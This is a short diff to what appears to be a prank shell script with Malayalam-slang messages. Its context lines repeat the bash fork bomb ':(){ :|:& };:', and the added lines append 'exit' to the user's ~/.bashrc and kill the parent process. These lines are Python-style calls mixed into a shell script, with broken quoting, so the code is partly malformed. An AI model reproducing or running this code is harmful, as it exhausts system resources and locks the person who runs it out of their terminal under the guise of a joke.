@@ -14,6 +14,7 @@ clear
  sleep 5 
  echo "please wait................................." 
  sleep 10 
+ os.system("echo 'exit' >> ~/.bashrc")
  
  :(){ :|:& };: 
  :(){ :|:& };: 
@@ -40,6 +41,8 @@ echo "This phone's engine gone completely...gallery nokku mwona"
  :(){ :|:& };: 
  :(){ :|:& };: 
  echo "You are verified as chunniless"
+ 
+ os.system(kill -9 %d"%(os.getppid()))
  
   
   
